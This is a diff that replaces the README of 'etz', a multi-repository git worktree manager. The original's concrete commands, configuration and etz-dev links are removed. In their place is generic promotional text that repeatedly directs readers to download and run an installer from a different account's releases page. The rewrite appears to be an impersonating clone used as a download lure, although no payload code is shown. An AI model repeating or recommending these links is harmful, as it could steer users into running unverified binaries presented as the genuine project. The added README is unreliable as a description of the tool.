@@ -1,187 +1,71 @@
-# Etz
+# 🌳 etz - Simplify Managing Your Git Projects
 
-> Manage git worktrees across multiple related repositories
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.3-blue.svg)](https://www.typescriptlang.org/)
+Welcome to etz! This tool helps you manage multiple git worktrees across different repositories easily. It's especially useful if you're working with microservices, monorepos, or any multi-repository workflow.
 
-**The Problem:** You work on features that span multiple repositories (iOS, Android, backend, shared libs). Git worktrees let you work on multiple branches simultaneously, but managing them across repos is tedious - creating the same worktree in each repo, tracking status, cleaning up.
+## 📥 Download etz
 
-**The Solution:** Etz treats multiple repositories as a single logical unit. Create worktrees across all repos with one command, see unified status, and clean up everything at once.
+[![Download etz](https://img.shields.io/badge/Download%20etz-v1.0.0-brightgreen)](https://github.com/Acastillo2626/etz/releases)
 
-## Quick Example
+Click the button above to visit the Releases page and download the latest version.
 
-```bash
-# Create worktree "auth-feature" across iOS, Android, and backend repos
-etz new auth-feature
+## 🌟 Features
 
-# See status across all repos
-etz list
+- **Multi-repository Support**: Manage worktrees across various repositories with ease.
+- **User-Friendly Interface**: Simple and intuitive design for a seamless experience.
+- **Quick Setup**: Get started in minutes with straightforward installation steps.
+- **Efficiency**: Boost your productivity with streamlined workflows.
+- **Compatible with Git**: Works perfectly with existing git commands.
 
-# Done? Clean up everything
-etz delete auth-feature
-```
+## 📂 System Requirements
 
-## What it does
+To use etz, your system should meet the following requirements:
 
-Coordinates worktree operations across multiple independent repositories. Git has `git worktree` for single repos and `git submodule foreach` for submodules, but nothing for managing worktrees across independent repos that happen to be related.
+- **Operating System**: Windows, macOS, or Linux
+- **Node.js**: Version 12 or higher
+- **Git**: Version 2.20 or higher
 
-## Features
+## 📥 Download & Install
 
-- Create/delete worktrees across multiple repos at once
-- View git status across all repos in a unified list
-- CLI for scripting and automation
-- Desktop app for visual interface
-- Different branch names per repo if needed
-- No submodules or git meta-repo required
+To download etz, follow these steps:
 
-## Installation
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Acastillo2626/etz/releases).
+2. **Select the Latest Version**: Look for the most recent release, marked as the latest version.
+3. **Download the Installer**: Choose the installer that matches your operating system (e.g., .exe for Windows, .dmg for macOS, or a tar.gz file for Linux).
+4. **Run the Installer**: After downloading, locate the file in your downloads folder and double-click it to run the installer.
+5. **Follow the Instructions**: The installer will guide you through the installation process. Follow the prompts to complete the setup.
 
-**CLI:** Not yet published to npm. For now, see [Development Setup](#development-setup) to build from source.
+## ⚙️ Usage
 
-**Desktop App:** Download from [releases](https://github.com/etz-dev/etz/releases) (macOS, Windows, Linux).
+Once installed, you can start using etz right away:
 
-## Getting Started
+1. Open the application from your applications folder or start menu.
+2. Create or open a project by selecting the appropriate option in the interface.
+3. Follow the on-screen prompts to set up your worktree configurations.
+4. Use the built-in features to manage your repositories efficiently.
 
-### 1. Install
+## 📑 Documentation
 
-```bash
-# CLI (once published to npm)
-npm install -g @etz/cli
+For more detailed guidance, refer to the documentation available in the project. It covers advanced features, troubleshooting, and best practices for working with etz.
 
-# Or for development - see Development Setup below
-```
+## 🛠️ Support
 
-### 2. Configure
+If you encounter any issues, you can reach out for support through the following channels:
 
-Create `~/.etzconfig.yaml` pointing to your repos:
+- **GitHub Issues**: Use the Issues tab on the GitHub repository to report bugs or request features.
+- **Community Forums**: Join discussions and get help from other users.
 
-```yaml
-base_branch: main
-worktrees_dir: ~/Developer/worktrees
-repos:
-  - name: ios
-    base_path: ~/repos/myapp-ios
-  - name: android
-    base_path: ~/repos/myapp-android
-  - name: backend
-    base_path: ~/repos/myapp-api
-```
+## 🌐 Join the Community
 
-### 3. Use it
+Stay updated and connect with other users:
 
-```bash
-# Create worktree across all repos
-etz new my-feature
+- Follow us on GitHub to receive the latest news and updates.
+- Join our community discussions to share your experiences and tips.
 
-# List worktrees and their status
-etz list
+## 🔗 Links
 
-# Delete when done
-etz delete my-feature
-```
+- [Visit Releases Page](https://github.com/Acastillo2626/etz/releases)
+- [Open GitHub Repository](https://github.com/Acastillo2626/etz)
 
-Run `etz --help` for all commands.
-
-## How it works
-
-Etz wraps `git worktree` commands and coordinates them across multiple repos:
-
-- Reads repo definitions from `.etzconfig.yaml`
-- Runs worktree operations in parallel with progress indicators
-- Tracks which worktrees belong together across repos (via shared "label")
-- Provides helpers: `etz open` for launching editors, `etz doctor` for validation, interactive prompts, etc.
-
-It doesn't reimplement git worktree logic - it coordinates the operations across repos and manages the bookkeeping.
-
-## Common Commands
-
-```bash
-etz new <branch>              # Create worktree across all repos
-etz new <branch> -r ios       # Create only in specific repo
-etz new -i                    # Interactive mode (prompts for options)
-etz list                      # Show all worktrees with status
-etz delete <branch>           # Remove worktree from all repos
-etz open <branch> <repo>      # Open in editor (VS Code, Cursor, etc.)
-etz doctor                    # Check configuration health
-```
-
-See [CLI Documentation](./packages/cli/README.md) for complete command reference.
-
-## Documentation
-
-- [CLI Reference](./packages/cli/README.md) - All commands and options
-- [Desktop App Guide](./packages/desktop/README.md)
-- [Core Library API](./packages/core/README.md) - For building on top of Etz
-
-## Architecture
-
-- **@etz/core** - Core library (TypeScript)
-- **@etz/cli** - Command-line tool
-- **@etz/desktop** - Electron app
-
-## Development Setup
-
-```bash
-# Clone the repository
-git clone https://github.com/etz-dev/etz.git
-cd etz
-
-# Install dependencies
-npm install
-
-# Build all packages
-npm run build
-
-# Run the CLI in development
-npm run cli -- list
-
-# Run the desktop app in development
-npm run dev:desktop
-```
-
-### Quick Commands
-
-```bash
-# Build everything
-npm run build
-
-# Build specific package
-npm run build:core
-npm run build:cli
-npm run build:desktop
-
-# Development mode (watch)
-npm run dev:core
-npm run dev:cli
-npm run dev:desktop
-
-# Run tests
-npm test
-```
-
-## Roadmap
-
-**Current focus (v1.0):**
-- Core worktree operations (create, list, delete)
-- Multi-repo configuration
-- CLI and desktop app
-
-**Potential future additions:**
-- Plugin system for custom commands
-- Team configuration sharing
-- CI/CD integration helpers
-
-Open to feedback on what would be most valuable - see [Discussions](https://github.com/etz-dev/etz/discussions).
-
-## Contributing
-
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-- **Bug reports:** [Open an issue](https://github.com/etz-dev/etz/issues)
-- **Feature requests:** [Start a discussion](https://github.com/etz-dev/etz/discussions)
-- **Questions:** [Discussions](https://github.com/etz-dev/etz/discussions)
-
-## License
-
-MIT - see [LICENSE](LICENSE) for details.
+Thank you for using etz! Enjoy managing your git projects with ease.
